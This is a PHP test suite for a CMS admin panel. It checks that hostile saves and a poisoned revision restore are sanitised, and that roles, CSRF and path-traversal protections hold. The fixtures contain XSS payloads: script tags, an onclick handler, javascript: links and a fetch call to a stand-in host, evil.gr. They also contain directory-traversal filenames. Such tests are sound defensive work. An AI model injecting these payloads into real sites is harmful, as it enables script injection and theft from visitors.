<?php
/**
 * The test that matters: a client (or anyone with their login) can change
 * values and nothing else. Runs a hostile save, then inspects what actually
 * landed on disk.
 */

declare(strict_types=1);

// The session backs the CSRF token; open it before this harness prints anything.
session_start();

require __DIR__ . '/lib.php';

use Symfony\Component\Yaml\Yaml;

putenv('AUTH_DEV_BYPASS=1');   // explicit, exactly as .ddev/config.yaml does it

$_SESSION['csrf'] = 'test-token';
$hostile = require __DIR__ . '/fixtures/hostile_save.php';

$file   = dirname(__DIR__) . '/content/pages/home.yml';
$backup = $file . '.bak';
copy($file, $backup);

$before = Yaml::parseFile($file);

// Correct baseline: this save is legitimate in every way except its payload.
$response = admin_post($hostile('test-token', (string) hash_file('sha256', $file)));

$after = Yaml::parseFile($file);
$hero  = $after['blocks'][0]['fields'];
$intro = $after['blocks'][1]['fields'];

section('Save completed');
// Stronger than the old "the child process exited 0": a save that fell into the
// error page also exited 0. Only the write path redirects.
ok($response->getStatusCode() === 303, 'the save was accepted and redirected (303), not refused');
ok(count($after['blocks']) === count($before['blocks']), 'block count unchanged (4)');

section('Structure is not editable');
ok($after['blocks'][0]['type'] === 'hero', 'posting blocks[hero][type] did not retype the component');
ok($after['slug'] === '/', 'posting slug did not move the page');
ok(array_column($after['blocks'], 'id') === array_column($before['blocks'], 'id'), 'block ids and order untouched');
ok(!in_array('injected_block', array_column($after['blocks'], 'id'), true), 'posting an unknown block id added nothing');
ok(!array_key_exists('evil', $hero), 'field not present in schema.yml was dropped');

section('Locked fields stay locked');
ok($hero['align'] === 'center', 'editable:false field ignored on save (still "center", posted "start")');

section('Legitimate edits go through');
ok($hero['subheading'] === 'Νέος υπότιτλος από τον πελάτη.', 'subheading updated');
ok($after['title'] === 'Αρχική σελίδα bold', 'page title trimmed, whitespace collapsed, tags stripped');

section('Text fields are sanitised');
missing($hero['heading'], '<script', 'script tag stripped from text field');
missing($hero['heading'], 'onerror', 'inline event handler stripped');
ok($hero['heading'] === 'Καλημέρα alert(1)', 'heading reduced to plain text: ' . $hero['heading']);
ok(mb_strlen($hero['heading']) <= 70, 'max length respected');

section('Link fields reject hostile URLs');
ok($hero['cta_url'] === '', 'javascript: URL rejected outright');

section('Rich text is whitelisted');
missing($intro['body'], '<script', 'script tag removed');
missing($intro['body'], '<style', 'style tag removed');
missing($intro['body'], 'onclick', 'attribute stripped from allowed tag');
missing($intro['body'], '<font', 'Word-paste font tag removed');
missing($intro['body'], 'javascript:', 'javascript: link removed');
contains($intro['body'], '<strong>έντονο</strong>', 'allowed formatting preserved');
contains($intro['body'], '<a href="https://example.gr" target="_blank" rel="noopener noreferrer">', 'external link kept and made safe');
missing($intro['body'], '&nbsp;</p>', 'empty paragraph dropped');

section('Revisions');
$revs = glob(dirname(__DIR__) . '/content/.revisions/home.*.yml') ?: [];
ok(count($revs) >= 1, 'a revision snapshot was written before saving');

section('Page still renders after a hostile save');
$html = cms()->renderPage(cms()->content->load('home'));
missing($html, '<script>alert', 'no injected script in the rendered page');
contains($html, 'Νέος υπότιτλος', 'edited copy is live');

// ── Roles ───────────────────────────────────────────────────────────────────
// Everything below runs against a real Cloudflare Access token, because the
// question Phase 3 added — "this address authenticated, but may it be here?" —
// only has an honest answer on the path a real request takes.

$ADMIN   = 'fotis@wearedope.com';   // config/roles.yml: admin
$EDITOR  = 'pelatis@example.gr';    // config/roles.yml: editor
$UNKNOWN = 'kanenas@example.gr';    // not in config/roles.yml at all

/** The forged save an editor would send to change an editable:admin field. */
$forgeEmail = static fn (string $value): array => [
    'action'   => 'save',
    'csrf'     => 'test-token',
    'page'     => 'home',
    'baseline' => (string) hash_file('sha256', dirname(__DIR__) . '/content/pages/home.yml'),
    'blocks'   => ['contact' => ['email' => $value, 'heading' => 'Πείτε μας τι χρειάζεστε']],
];

$emailOf = static fn (): string => (string) Yaml::parseFile($file)['blocks'][3]['fields']['email'];

section('An authenticated address is not automatically a user');
$stranger = as_user($UNKNOWN, 'GET', ['action' => 'edit', 'page' => 'home']);
ok($stranger->getStatusCode() === 403, 'an email absent from roles.yml is refused, not made an implicit editor');
missing((string) $stranger->getContent(), 'name="blocks[hero][heading]"', 'and sees no edit form');
missing((string) $stranger->getContent(), 'Cloudflare Access', 'the refusal does not tell them to log in again — they already did');
// This is the one panel page a refused client ever sees, and the person seeing
// it is usually a real editor nobody added to roles.yml, not an intruder.
contains((string) $stranger->getContent(), '<!DOCTYPE html>', 'the 403 is a whole page, not a bare fragment');
contains((string) $stranger->getContent(), 'Demo Πελάτη', 'rendered through the panel layout, so it looks refused rather than broken');

$listed = as_user($EDITOR, 'GET', ['action' => 'edit', 'page' => 'home']);
ok($listed->getStatusCode() === 200, 'a listed address gets in');
contains((string) $listed->getContent(), $EDITOR, 'and the panel names who it thinks they are');

section('editable:admin is refused on save, not merely disabled in the UI');
ok(cms()->components->get('contact_cta')['fields']['email']['editable'] === 'admin',
    'contact_cta.email is declared editable: admin');

$was = $emailOf();
$forged = as_user($EDITOR, 'POST', $forgeEmail('editor@evil.gr'));
ok($forged->getStatusCode() === 303, 'the editor\'s save is accepted — this is a forged field, not a forged request');
ok($emailOf() === $was, 'but the editable:admin field is unchanged (' . $emailOf() . '), even though it was posted');

$allowed = as_user($ADMIN, 'POST', $forgeEmail('nea@example.gr'));
ok($allowed->getStatusCode() === 303, 'an admin posting the same field is accepted');
ok($emailOf() === 'nea@example.gr', 'and for an admin the field really is written');

section('The edit form locks what the save path would refuse');
$editorForm = (string) as_user($EDITOR, 'GET', ['action' => 'edit', 'page' => 'home'])->getContent();
$adminForm  = (string) as_user($ADMIN, 'GET', ['action' => 'edit', 'page' => 'home'])->getContent();
ok((bool) preg_match('/id="contact-email"[^>]*readonly/', $editorForm), 'an editor sees the admin-only field read-only');
ok(!preg_match('/id="contact-email"[^>]*readonly/', $adminForm), 'an admin does not');
missing($editorForm, 'action=revisions', 'an editor is not offered the revisions link');
contains($adminForm, 'action=revisions', 'an admin is');

section('Revisions are admin-only, and forging the action does not help');
$revs = cms()->content->revisions('home');
ok(count($revs) >= 1, 'the saves above left revisions to list');

$adminList = as_user($ADMIN, 'GET', ['action' => 'revisions', 'page' => 'home']);
ok($adminList->getStatusCode() === 200, 'an admin can list revisions');
contains((string) $adminList->getContent(), $revs[0]['file'], 'and sees a restorable version');

$editorList = as_user($EDITOR, 'GET', ['action' => 'revisions', 'page' => 'home']);
ok($editorList->getStatusCode() === 403, 'an editor forging ?action=revisions gets 403, not 400');
missing((string) $editorList->getContent(), $revs[0]['file'], 'and no revision name leaks in the refusal');
missing((string) $editorList->getContent(), 'Νέος υπότιτλος', 'nor any revision content');

$editorRestore = as_user($EDITOR, 'POST', [
    'action' => 'restore', 'csrf' => 'test-token', 'page' => 'home', 'revision' => $revs[0]['file'],
]);
ok($editorRestore->getStatusCode() === 403, 'an editor forging action=restore gets 403');
ok($emailOf() === 'nea@example.gr', 'and nothing was written by the attempt');

$noCsrf = as_user($ADMIN, 'POST', [
    'action' => 'restore', 'csrf' => 'forged', 'page' => 'home', 'revision' => $revs[0]['file'],
]);
contains((string) $noCsrf->getContent(), 'Η συνεδρία έληξε', 'even an admin needs a CSRF token to restore');
ok($noCsrf->getStatusCode() === 400, 'and the forged restore is refused');

section('A revision name is a filename, never a path');
foreach ([
    '../../pages/home.yml'                  => 'traversal',
    'home.20260101-000000-aaaaaa.yml/../x'  => 'traversal past a valid-looking name',
    'epikoinonia.20260101-000000-aaaaaa.yml' => "another page's history",
    'home.yml'                              => 'the live page file itself',
] as $name => $why) {
    $r = as_user($ADMIN, 'POST', [
        'action' => 'restore', 'csrf' => 'test-token', 'page' => 'home', 'revision' => $name,
    ]);
    ok($r->getStatusCode() === 400, 'restore refuses ' . $why);
    missing((string) $r->getContent(), '/var/www', 'and the refusal leaks no path (' . $why . ')');
}

section('Restore re-runs the sanitiser instead of copying the file back');
// A revision written *before* the allowlist tightened: hostile HTML sitting on
// disk in a file the panel is about to put back. copy() would land it verbatim,
// and text_image renders body with |raw.
$revDir = dirname(__DIR__) . '/content/.revisions';
$poisoned = Yaml::parseFile($file);
$poisoned['title'] = 'Παλιός <b>τίτλος</b>';
$poisoned['slug'] = '/hijacked';
$poisoned['blocks'][0]['fields']['heading'] = 'Παλιά επικεφαλίδα <script>alert(1)</script>';
$poisoned['blocks'][0]['fields']['align'] = 'start';                     // editable: false
$poisoned['blocks'][1]['fields']['body'] = '<p onclick="steal()">Παλιό κείμενο'
    . '<script>fetch("//evil.gr")</script><a href="javascript:alert(1)">κακός</a></p>';
$poisoned['blocks'][3]['fields']['email'] = 'palio@example.gr';          // editable: admin
$poisoned['blocks'][] = ['id' => 'ghost', 'type' => 'hero', 'fields' => ['heading' => 'Δεν υπάρχω']];
$poisonedName = 'home.20260101-000000-abcdef.yml';
file_put_contents($revDir . '/' . $poisonedName, Yaml::dump($poisoned, 6, 2));

$restored = as_user($ADMIN, 'POST', [
    'action' => 'restore', 'csrf' => 'test-token', 'page' => 'home', 'revision' => $poisonedName,
]);
ok($restored->getStatusCode() === 303, 'the restore is accepted');

$after2 = Yaml::parseFile($file);
$hero2  = $after2['blocks'][0]['fields'];
$intro2 = $after2['blocks'][1]['fields'];

missing($hero2['heading'], '<script', 'a script tag in the revision is stripped on the way back in');
ok($hero2['heading'] === 'Παλιά επικεφαλίδα alert(1)', 'the restored text went through the same sanitiser as a save: ' . $hero2['heading']);
missing($intro2['body'], '<script', 'richtext from the revision is re-sanitised, not trusted');
missing($intro2['body'], 'onclick', 'and its attributes are stripped');
missing($intro2['body'], 'javascript:', 'and its hostile hrefs are dropped');
contains($intro2['body'], 'Παλιό κείμενο', 'while the legitimate text is restored');
ok($after2['title'] === 'Παλιός τίτλος', 'the title is restored, sanitised');

ok($after2['slug'] === '/', 'a revision cannot move the page — structure comes from the file, not the revision');
ok(count($after2['blocks']) === 4, 'nor add a block that is not in the file');
ok($hero2['align'] === 'center', 'an editable:false field is not overwritten by a revision either');
ok($after2['blocks'][3]['fields']['email'] === 'palio@example.gr', 'but an editable:admin field is, because restore is an admin flow');

$html2 = cms()->renderPage(cms()->content->load('home'));
missing($html2, '<script>alert', 'and the restored page renders with nothing injected');
missing($html2, 'evil.gr', 'nor any laundered link');

ok(count(cms()->content->revisions('home')) > count($revs), 'the version being replaced was snapshotted first — a restore is undoable');

// restore
rename($backup, $file);
// Scoped to the fixture page: a suite run must never wipe real revision history.
array_map('unlink', glob(dirname(__DIR__) . '/content/.revisions/home.*.yml') ?: []);

summary();
